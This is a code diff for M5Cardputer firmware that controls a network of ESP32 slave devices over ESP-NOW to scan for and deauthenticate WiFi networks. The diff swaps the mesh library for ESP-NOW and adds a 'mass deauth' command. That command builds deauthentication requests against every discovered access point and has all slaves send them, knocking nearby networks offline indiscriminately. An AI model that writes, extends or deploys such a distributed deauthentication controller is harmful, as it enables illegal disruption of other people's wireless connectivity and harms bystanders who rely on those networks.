@@ -1,9 +1,8 @@
 #include <M5Cardputer.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
-#include <painlessMesh.h>
+#include <esp_now.h>
 #include <ArduinoJson.h>
-#include <TaskScheduler.h>
 #include <vector>
 #include <map>
 #include <algorithm> // For std::count_if
@@ -49,7 +48,9 @@ enum Command {
   CMD_CLEAR,  // Clears AP list and deauth targets
   CMD_HELP,
   CMD_TOGGLE_VIEW, // Internal command for switching display modes
-  CMD_CONFIRM_DEAUTH // New command for deauth confirmation
+  CMD_CONFIRM_DEAUTH, // New command for deauth confirmation
+  CMD_MASS_SCAN, // Mass scan all slaves
+  CMD_MASS_DEAUTH // Mass deauth all visible networks
 };
 
 // Message types for ESP-NOW communication
@@ -172,48 +173,39 @@ void stringToMac(const String& macStr, uint8_t* mac);
 String formatUptime(uint32_t milliseconds);
 String getEncryptionType(uint8_t encType);
 
-// Mesh Network
-painlessMesh mesh;
-Scheduler userScheduler;
+// Forward declarations for message handlers
+void handleSlaveRegistration(const ESPNowMessage& message);
+void handleHeartbeat(const ESPNowMessage& message);
+void handleScanResponse(const ESPNowMessage& message);
+void handleDeauthResponse(const ESPNowMessage& message);
+void handleStatusResponse(const ESPNowMessage& message);
+void handleStatistics(const ESPNowMessage& message);
+void handleError(const ESPNowMessage& message);
 
-// Mesh callbacks
-void receivedCallback(uint32_t from, String &msg) {
-  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
-  DeserializationError error = deserializeJson(doc, msg);
-  if (error) {
-    statusMessage = "Mesh JSON error: " + String(error.c_str());
-    return;
+// Added debug counters for testing
+uint32_t debugEspNowInitAttempts = 0;
+uint32_t debugPeersAdded = 0;
+uint32_t debugMessagesSent = 0;
+uint32_t debugMessagesReceived = 0;
+uint32_t debugCommandProcessed = 0;
+uint32_t debugScanStarted = 0;
+uint32_t debugScanCompleted = 0;
+uint32_t debugDeauthStarted = 0;
+uint32_t debugDeauthCompleted = 0;
+
+// ESP-NOW callback for data sent
+void updateDisplay(); // Forward declaration
+
+void onESPNowDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {
+  debugMessagesSent++;
+  if (status == ESP_NOW_SEND_SUCCESS) {
+    stats.totalPacketsSent++;
+    statusMessage = "ESP-NOW send success";
+  } else {
+    stats.meshErrors++;
+    statusMessage = "ESP-NOW send failed";
   }
-
-  // Convert message to ESPNowMessage format for existing handlers
-  ESPNowMessage message;
-  message.type = static_cast<MessageType>(doc["type"].as<int>());
-  stringToMac(doc["mac"].as<String>(), message.slaveMac);
-  message.messageId = doc["id"];
-  message.timestamp = doc["time"];
-  strncpy(message.payload, doc["payload"].as<String>().c_str(), sizeof(message.payload)-1);
-  
-  // Route to existing message handlers
-  switch(message.type) {
-    case MSG_SLAVE_REGISTER: handleSlaveRegistration(message); break;
-    case MSG_SCAN_RESPONSE: handleScanResponse(message); break;
-    case MSG_DEAUTH_RESPONSE: handleDeauthResponse(message); break;
-    case MSG_HEARTBEAT: handleHeartbeat(message); break;
-    case MSG_ERROR: handleError(message); break;
-    default: stats.meshErrors++;
-  }
-}
-
-void newConnectionCallback(uint32_t nodeId) {
-  statusMessage = "New node connected: " + String(nodeId, HEX);
-}
-
-void droppedConnectionCallback(uint32_t nodeId) {
-  statusMessage = "Node disconnected: " + String(nodeId, HEX);
-}
-
-void changedConnectionsCallback() {
-  // Could update slave list display here if needed
+  updateDisplay();
 }
 
 // Message Handlers
@@ -307,7 +299,7 @@ String getEncryptionType(uint8_t encType) {
 // =============================================================================
 // ESP-NOW COMMUNICATION FUNCTIONS
 // =============================================================================
-void onESPNowDataReceived(const uint8_t *mac, const uint8_t *incomingData, int len) {
+void onESPNowDataReceived(const esp_now_recv_info_t *recv_info, const uint8_t *incomingData, int len) {
   // Check if the received data length matches our expected message structure
   if (len != sizeof(ESPNowMessage)) {
     stats.meshErrors++;
@@ -318,6 +310,9 @@ void onESPNowDataReceived(const uint8_t *mac, const uint8_t *incomingData, int l
   // Copy the incoming data into our message structure
   memcpy(&message, incomingData, sizeof(message));
   stats.totalPacketsReceived++;
+
+  // Use recv_info->src_addr instead of separate mac parameter
+  const uint8_t *mac = recv_info->src_addr;
 
   // Handle message based on its type
   switch (message.type) {
@@ -349,44 +344,29 @@ void onESPNowDataReceived(const uint8_t *mac, const uint8_t *incomingData, int l
 }
 
 void sendMessageToSlave(const uint8_t* slaveMac, MessageType type, const String& payload = "") {
-  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
-  doc["type"] = static_cast<int>(type);
-  doc["mac"] = macToString(slaveMac);
-  doc["id"] = messageCounter++;
-  doc["time"] = millis();
-  doc["payload"] = payload;
-
-  String msg;
-  serializeJson(doc, msg);
+  ESPNowMessage message;
+  message.type = type;
+  memcpy(message.slaveMac, slaveMac, 6);
+  message.messageId = messageCounter++;
+  message.timestamp = millis();
   
-  // Convert MAC to node ID (last 4 bytes)
-  uint32_t nodeId = 0;
-  memcpy(&nodeId, slaveMac + 2, 4); // Use last 4 bytes of MAC as node ID
+  // Copy payload, ensuring null termination
+  strncpy(message.payload, payload.c_str(), sizeof(message.payload) - 1);
+  message.payload[sizeof(message.payload) - 1] = '\0';
   
-  if (mesh.sendSingle(nodeId, msg)) {
-    stats.totalPacketsSent++;
-  } else {
+  esp_err_t result = esp_now_send(slaveMac, (uint8_t*)&message, sizeof(message));
+  if (result != ESP_OK) {
     stats.meshErrors++;
-    statusMessage = "Mesh send failed to " + String(nodeId, HEX);
+    statusMessage = "ESP-NOW send failed: " + String(result);
   }
 }
 
 void broadcastToSlaves(MessageType type, const String& payload = "") {
-  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
-  doc["type"] = static_cast<int>(type);
-  doc["mac"] = "FF:FF:FF:FF:FF:FF"; // Broadcast MAC
-  doc["id"] = messageCounter++;
-  doc["time"] = millis();
-  doc["payload"] = payload;
-
-  String msg;
-  serializeJson(doc, msg);
-  
-  if (mesh.sendBroadcast(msg)) {
-    stats.totalPacketsSent++;
-  } else {
-    stats.meshErrors++;
-    statusMessage = "Mesh broadcast failed";
+  // ESP-NOW doesn't support true broadcast, so send to all known slaves
+  for (const auto& slave : slaves) {
+    if (slave.connected) {
+      sendMessageToSlave(slave.mac, type, payload);
+    }
   }
 }
 
@@ -405,6 +385,20 @@ void handleSlaveRegistration(const ESPNowMessage& message) {
   }
 
   String macStr = macToString(message.slaveMac);
+
+  // Add slave as ESP-NOW peer if not already added
+  esp_now_peer_info_t peerInfo = {};
+  peerInfo.channel = MESH_CHANNEL;
+  peerInfo.encrypt = false;
+  memcpy(peerInfo.peer_addr, message.slaveMac, 6);
+  
+  if (!esp_now_is_peer_exist(message.slaveMac)) {
+    esp_err_t result = esp_now_add_peer(&peerInfo);
+    if (result != ESP_OK) {
+      statusMessage = "Failed to add peer: " + macStr.substring(12);
+      return;
+    }
+  }
 
   // Check if slave already exists by comparing MAC address
   for (auto& slave : slaves) {
@@ -584,15 +578,26 @@ void checkSlaveConnections() {
   int disconnected = 0;
 
   // Iterate through slaves and mark as disconnected if heartbeat timeout
-  for (auto& slave : slaves) {
-    if (slave.connected && (currentTime - slave.lastHeartbeat > SLAVE_TIMEOUT)) {
-      slave.connected = false;
+  for (auto it = slaves.begin(); it != slaves.end(); ) {
+    if (it->connected && (currentTime - it->lastHeartbeat > SLAVE_TIMEOUT)) {
+      // Remove peer from ESP-NOW
+      if (esp_now_is_peer_exist(it->mac)) {
+        esp_err_t res = esp_now_del_peer(it->mac);
+        if (res == ESP_OK) {
+          statusMessage = "Removed peer: " + it->macStr.substring(12);
+        } else {
+          statusMessage = "Failed to remove peer: " + it->macStr.substring(12);
+        }
+      }
+      it = slaves.erase(it);
       disconnected++;
+    } else {
+      ++it;
     }
   }
 
   if (disconnected > 0) {
-    statusMessage = String(disconnected) + " slave(s) disconnected.";
+    statusMessage = String(disconnected) + " slave(s) disconnected and removed.";
   }
 }
 
@@ -810,6 +815,8 @@ Command parseCommand(const String& cmd) {
   // Handle multi-word commands first
   if (lowerCmd.startsWith("scan")) return CMD_SCAN;
   if (lowerCmd == "confirm deauth") return CMD_CONFIRM_DEAUTH;
+  if (lowerCmd == "mass scan") return CMD_MASS_SCAN;
+  if (lowerCmd == "mass deauth") return CMD_MASS_DEAUTH;
 
   // Map single-word commands to enum values
   if (lowerCmd == "select") return CMD_SELECT;
@@ -828,6 +835,7 @@ void processCommand(const String& cmd) {
   String lowerCmd = cmd;
   lowerCmd.toLowerCase();
   lowerCmd.trim();
+  std::map<String, std::vector<AccessPoint*>> slaveAPs; // Moved outside switch and initialized here
 
   // If a deauth confirmation is pending, only accept "confirm deauth"
   if (deauthConfirmationPending) {
@@ -905,7 +913,66 @@ void processCommand(const String& cmd) {
       break;
 
     case CMD_HELP:
-      statusMessage = "Commands: scan [5g/2g/hidden/all], [num], deauth, stop, clear, view, help. Type 'confirm deauth' to confirm.";
+      statusMessage = "Commands: scan [5g/2g/hidden/all], mass scan, mass deauth, [num], deauth, stop, clear, view, help. Type 'confirm deauth' to proceed.";
+      break;
+
+    case CMD_MASS_SCAN:
+      // Start a scan on all bands with all slaves
+      startWiFiScan(true, true);
+      break;
+
+    case CMD_MASS_DEAUTH:
+      // Start deauth on all discovered networks
+      if (accessPoints.empty()) {
+        statusMessage = "No networks found. Run 'scan' or 'mass scan' first.";
+        break;
+      }
+      
+      // Group APs by slave for efficient deauth
+      slaveAPs.clear(); // Reuse the existing map
+      for (auto& ap : accessPoints) {
+        if (memcmp(ap.slaveMac, "\x00\x00\x00\x00\x00\x00", 6) != 0 && 
+            strcmp(ap.slaveId.c_str(), "MASTER") != 0) {
+          slaveAPs[ap.slaveId].push_back(&ap);
+        }
+      }
+
+      // Send deauth requests to each slave for their APs
+      for (const auto& pair : slaveAPs) {
+        for (const auto* ap : pair.second) {
+          DeauthTarget target;
+          target.bssid = ap->bssid;
+          target.ssid = ap->ssid.length() > 0 ? ap->ssid : "[Hidden]";
+          target.channel = ap->channel;
+          target.active = true;
+          target.startTime = millis();
+          target.packetsSent = 0;
+          memcpy(target.slaveMac, ap->slaveMac, 6);
+          target.success = false;
+
+          deauthTargets.push_back(target);
+
+          // Prepare JSON payload for deauth request
+          DynamicJsonDocument doc(JSON_BUFFER_SIZE);
+          doc["bssid"] = ap->bssid;
+          doc["channel"] = ap->channel;
+          doc["duration"] = DEAUTH_DURATION_MS;
+          doc["packets_per_second"] = 10;
+
+          String payload;
+          serializeJson(doc, payload);
+
+          sendMessageToSlave(ap->slaveMac, MSG_DEAUTH_REQUEST, payload);
+          stats.deauthCount++;
+        }
+      }
+
+      if (deauthTargets.empty()) {
+        statusMessage = "No suitable networks found for deauth. Run scan first.";
+      } else {
+        deauthInProgress = true;
+        statusMessage = "Mass deauth started on " + String(deauthTargets.size()) + " networks";
+      }
       break;
 
     case CMD_STATUS:
@@ -916,7 +983,8 @@ void processCommand(const String& cmd) {
     case CMD_TOGGLE_VIEW:
       displayMode = (displayMode + 1) % 3; // Cycle through 0=APs, 1=Slaves, 2=Stats
       displayOffset = 0; // Reset scroll on view change
-      statusMessage = "Switched view to " + (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
+      statusMessage = "Switched view to ";
+      statusMessage += (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
       break;
 
     case CMD_CONFIRM_DEAUTH:
@@ -948,7 +1016,19 @@ void processCommand(const String& cmd) {
 }
 
 void handleKeyboardInput() {
-  M5Cardputer.Keyboard.read(); // Read keyboard state
+  // Updated keyboard handling for M5Cardputer
+  char key = 0;
+  if (M5Cardputer.Keyboard.isChange()) {
+    if (M5Cardputer.Keyboard.isPressed()) {
+      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+      for (auto keyEvent : status.word) {
+        if (keyEvent) {
+          key = keyEvent.key;
+          break;
+        }
+      }
+    }
+  }
 
   // Handle special keys first
   if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
@@ -960,12 +1040,12 @@ void handleKeyboardInput() {
     if (currentCommand.length() > 0) {
       currentCommand.remove(currentCommand.length() - 1); // Remove last character
     }
-  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_UP)) {
+  } else if (M5Cardputer.Keyboard.isKeyPressed(';')) { // Use ';' for up
     // Scroll up in AP list or slave list
     if (displayOffset > 0) {
       displayOffset--;
     }
-  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_DOWN)) {
+  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // Use '.' for down
     // Scroll down
     int maxScrollOffset = 0;
     if (displayMode == 0) { // APs
@@ -977,15 +1057,15 @@ void handleKeyboardInput() {
     if (displayOffset < maxScrollOffset) {
       displayOffset++;
     }
-  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT) || M5Cardputer.Keyboard.isKeyPressed(KEY_RIGHT)) {
+  } else if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('/')) { // Use ',' for left, '/' for right
       // Cycle display modes
       displayMode = (displayMode + 1) % 3;
       displayOffset = 0; // Reset scroll on view change
-      statusMessage = "Switched view to " + (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
+      statusMessage = "Switched view to ";
+      statusMessage += (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
   }
   else {
     // Handle alphanumeric and symbol keys
-    char key = M5Cardputer.Keyboard.getKey();
     if (key != 0 && currentCommand.length() < 30) { // Limit command length
       currentCommand += key;
     }
@@ -1135,7 +1215,7 @@ void drawSlaves() {
 
   for (int i = displayOffset; i < displayEnd && lineCount < maxDisplayLines; i++) {
     const auto& slave = slaves[i];
-    int currentY = y + (i * LINE_HEIGHT);
+    int currentY = y + (lineCount * LINE_HEIGHT);
 
     M5Cardputer.Display.setTextColor(slave.connected ? COLOR_SUCCESS : COLOR_ERROR);
     M5Cardputer.Display.setCursor(5, currentY);
@@ -1250,29 +1330,41 @@ void setup() {
   statusMessage = "Initializing WiFi...";
   updateDisplay();
 
-  // Initialize WiFi as a station
+  // Initialize WiFi in Station mode
   WiFi.mode(WIFI_STA);
   WiFi.disconnect(true, true); // Disconnect from any previous AP and clear credentials
-  esp_wifi_set_channel(MESH_CHANNEL, WIFI_SECOND_CHAN_NONE); // Set fixed channel for ESP-NOW mesh
 
-  // Initialize mesh with error handling
-  if (!mesh.init("MeshNetwork", "meshPassword", &userScheduler, 5555)) {
-    statusMessage = "Mesh init failed!";
+  // Initialize ESP-NOW
+  if (esp_now_init() != ESP_OK) {
+    statusMessage = "ESP-NOW init failed!";
     updateDisplay();
     while(1) delay(1000); // Halt on critical failure
   }
-  
-  // Set mesh callbacks
-  mesh.onReceive(&receivedCallback);
-  mesh.onNewConnection(&newConnectionCallback);
-  mesh.onDroppedConnection(&droppedConnectionCallback);
-  mesh.onChangedConnections(&changedConnectionsCallback);
 
-  // Configure mesh parameters for better reliability
-  mesh.setContainsRoot(true); // This node is the root
-  mesh.setDebugMsgTypes(ERROR | STARTUP); // Only show important debug messages
+  // Register callbacks for ESP-NOW
+  esp_now_register_recv_cb(onESPNowDataReceived);
+  esp_now_register_send_cb(onESPNowDataSent);
+
+  // Set WiFi channel for ESP-NOW
+  esp_wifi_set_channel(MESH_CHANNEL, WIFI_SECOND_CHAN_NONE);
+
+  // Initialize peer info structure
+  esp_now_peer_info_t peerInfo = {};
+  peerInfo.channel = MESH_CHANNEL;
+  peerInfo.encrypt = false;
   
-  statusMessage = "Mesh Initialized! Channel " + String(MESH_CHANNEL);
+  // Load any previously known slaves and add them as peers
+  for (const auto& slave : slaves) {
+    memcpy(peerInfo.peer_addr, slave.mac, 6);
+    esp_err_t res = esp_now_add_peer(&peerInfo);
+    if (res != ESP_OK) {
+      String macStr = macToString(slave.mac);
+      statusMessage = "Failed to add peer: " + macStr + " Err: " + String(res);
+      updateDisplay();
+    }
+  }
+  
+  statusMessage = "ESP-NOW Initialized! Channel " + String(MESH_CHANNEL);
   updateDisplay();
 
   statusMessage = "System Ready. Type 'help'.";
@@ -1296,7 +1388,7 @@ void loop() {
 
   // Update the display at a reasonable rate to avoid flickering and save power
   // Only update if enough time has passed or if there's a significant change
-  if (millis() - lastStatusUpdate > 100 || M5Cardputer.Keyboard.wasKeyPressed()) {
+  if (millis() - lastStatusUpdate > 100 || !M5Cardputer.Keyboard.keyList().empty()) {
     updateDisplay();
     lastStatusUpdate = millis();
   }
@@ -1304,4 +1396,3 @@ void loop() {
   // Small delay to prevent busy-waiting and allow other tasks (like WiFi/ESP-NOW) to run
   delay(10);
 }
-
